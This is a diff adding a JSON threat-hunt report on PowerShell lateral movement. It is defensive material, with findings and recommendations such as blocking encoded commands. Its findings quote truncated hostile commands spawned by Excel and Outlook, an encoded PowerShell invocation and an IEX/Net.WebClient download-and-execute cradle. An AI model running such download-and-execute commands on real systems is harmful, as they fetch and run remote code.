@@ -1,0 +1,35 @@
+{
+  "hunt hypothesis": "Adversaries are using PowerShell for lateral movement",
+  "time_range": "2024-03-15 to 2024-03-20",
+  "data_sources": ["windows_security", "windows_powershell"],
+  "mitre_techniques": [
+    "T1059.001 - PowerShell",
+    "T1027 - Obfuscated Files",
+    "T1086 - PowerShell Shell"
+  ],
+  "findings": {
+    "suspicious_powershell": [
+      {
+        "timestamp": "2024-03-18T14:22:15Z",
+        "host": "WS-DEV-02",
+        "user": "john",
+        "command": "powershell -enc JABjAGwA...",
+        "parent_process": "excel.exe"
+      },
+      {
+        "timestamp": "2024-03-18T14:25:30Z",
+        "host": "WS-DEV-02",
+        "user": "john",
+        "command": "IEX (New-Object Net.WebClient).DownloadString",
+        "parent_process": "outlook.exe"
+      }
+    ],
+    "encoded_commands": 47,
+    "uncommon_parent_processes": ["excel.exe", "outlook.exe", "word.exe"]
+  },
+  "recommendations": [
+    "Block PowerShell encoded commands",
+    "Monitor parent processes for PowerShell spawning",
+    "Implement application whitelisting"
+  ]
+}
